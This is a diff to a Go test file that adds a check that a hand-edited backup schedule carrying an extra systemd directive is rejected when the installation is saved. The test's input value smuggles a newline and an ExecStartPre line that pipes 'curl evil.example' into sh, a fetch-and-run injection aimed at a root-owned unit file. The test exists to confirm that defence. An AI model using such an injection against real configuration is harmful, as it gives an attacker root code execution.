@@ -273,3 +273,21 @@ func onCalendar(t *testing.T, unitDir string) string {
 	t.Fatalf("no OnCalendar in the timer:\n%s", body)
 	return ""
 }
+
+// The same refusal on the path the guard actually exists for.
+//
+// `config set` is one way a schedule arrives; the other is somebody editing
+// installation.yaml, and that is the one the bound was written against -- the
+// value is rendered into `OnCalendar=` in a root-owned unit file. A guard that
+// only covered the command would have been a guard over the door nobody was
+// coming through, and the comment beside it would have been false.
+func TestAHandEditedScheduleIsRefusedOnLoad(t *testing.T) {
+	h := newHarness(t)
+	inst := h.install()
+	ctx := context.Background()
+
+	inst.Policy.BackupSchedule = "daily\nExecStartPre=/bin/sh -c 'curl evil.example | sh'"
+	err := h.Deps.State.SaveInstallation(ctx, inst)
+	require.Error(t, err, "an installation carrying a second unit directive was written")
+	assert.Contains(t, domain.AsError(err).Message, "backup_schedule")
+}
